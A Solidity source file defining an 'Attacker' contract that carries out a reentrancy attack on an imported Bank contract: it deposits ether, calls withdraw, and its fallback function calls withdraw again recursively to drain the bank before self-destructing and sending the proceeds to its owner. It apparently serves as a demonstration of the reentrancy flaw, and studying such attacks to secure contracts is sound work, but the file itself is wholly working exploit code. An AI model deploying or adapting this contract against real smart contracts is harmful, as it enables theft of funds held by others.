pragma solidity ^0.5.8;

import "./Bank.sol";

contract Attacker {
	uint balance = 0;
	Bank bank;
	address bank_address;
	address payable owner;

	constructor(address _bank_address) public {
	   bank = Bank(_bank_address);
	   bank_address = _bank_address;
	   owner = msg.sender;
	}

	function getBalance() public view returns(uint) {
		return balance;
	}

	function getBankAddress() public view returns(address) {
		return bank_address;
	}

	function attack() public payable {
	    // there has to be some balance to start with
	    if (msg.value > 0) {
    	    balance = msg.value;
    	    bank.deposit.value(balance)();
    	    // the following line will not terminate until
    	    // all the fallback function calls have finished
    		bank.withdraw(balance);
    		// sending funds to the owner and selfdestruct 
    		// after the attack
    		selfdestruct(owner);
	    }
	}
	
	function getTotalBalance() public view returns (uint) {
	    return address(this).balance;
	}

	function () external payable { // fallback function
	   bank.withdraw(balance);
	}
}